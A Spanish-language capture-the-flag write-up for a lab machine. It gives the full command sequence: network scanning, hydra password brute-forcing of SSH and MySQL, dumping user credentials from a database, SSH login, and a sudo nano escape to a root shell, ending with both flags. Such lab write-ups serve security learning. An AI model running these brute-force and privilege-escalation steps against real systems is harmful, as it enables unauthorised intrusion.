
```bash
arp-scan -I eth0 --localnet
nmap -p- --open -sS -sC -sV --min-rate=5000 -vvv -n -Pn 10.0.2.12 -oN escaneo
hydra -l capybarauser -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.12
hydra -t 64 -l capybarauser -P /usr/share/wordlists/rockyou_invertido.txt mysql://10.0.2.12
mysql -h 10.0.2.12 -u capybarauser -pie168
ssh mario@10.0.2.12
cat user.txt
sudo -l
script /dev/null -c bash
cd /root
ls
cat root.txt
```
Primero de todo ejecutamos un arp-scan para ver cual es la IP de la máquina víctima, una vez obtenemos su IP ejecutamos un nmap ![[Pasted image 20240302010624.png]]
Con este nmap descubriremos que los puertos 22, 80 y 3306 están abiertos![[Pasted image 20240302010711.png]]
Una vez visto esto entramos a la web de la máquina donde encontramos la siguiente imagen![[Pasted image 20240302010854.png]]
Debido a esto miramos el código fuente de la web en la que encontramos que hay un texto con un potencial usuario llamado capybarauser
![[Pasted image 20240302010920.png]]
Realizamos un ataque contra el protocolo ssh primero del cual no obtenemos la contraseña así que optamos a hacer un ataque contra el puerto 3306 que tiene un mysql corriendo
![[Pasted image 20240302010744.png]]
Este ataque si que nos encontrará una contraseña pero será mejor usar el rockyou_invertido y la contraseña es ie168
![[Pasted image 20240302010759.png]]
Ahora entramos a la base de datos![[Pasted image 20240302011357.png]]
```MySQL
show databases;
use pinguinasio_db;
show tables;
select * from users;
```
Primero miraremos las bases de datos que hay
![[Pasted image 20240302011720.png]]
Entramos en la base de datos pinguinasio_db y miramos sus tablas![[Pasted image 20240302011640.png]]![[Pasted image 20240302011655.png]]
Ahora vemos los usuarios que hay en la maquina y encontramos el usuario mario y la contraseña pinguinomolon123
![[Pasted image 20240302011907.png]]
Ahora entramos a la maquina por el protocolo ssh con el usuario y contraseña dados  ![[Pasted image 20240302012140.png]]![[Pasted image 20240302012156.png]]
Y sacamos la flag de usuario
![[Pasted image 20240302012254.png]]
Ahora procederemos a la escalada de privilegios
Haciendo un sudo -l encontraremos que tenemos permisos de administrador en nano![[Pasted image 20240302013126.png]]
Una vez sabemos eso ejecutamos nano como sudo
![[Pasted image 20240302013153.png]]
Y ahora ejecutamos los siguientes comandos
```nano
^R^X
reset; sh 1>&0 2>&0
```
Esto nos dará una shell de administrador
![[Pasted image 20240302013325.png]]
Con la cual ya podemos buscar la flag de root pero primero usaremos el siguiente comando para obtener un promt
![[Pasted image 20240302013551.png]]
Finalmente encontramos la flag de root en el directorio root siendo la siguiente flag![[Pasted image 20240302013830.png]]
Flag de user:  as_jaKeAdO_hAl_PiNGuiNo
Flag de root: eNhoRbUenA!!!JackEastEHalkAPyBArAtAMBIen
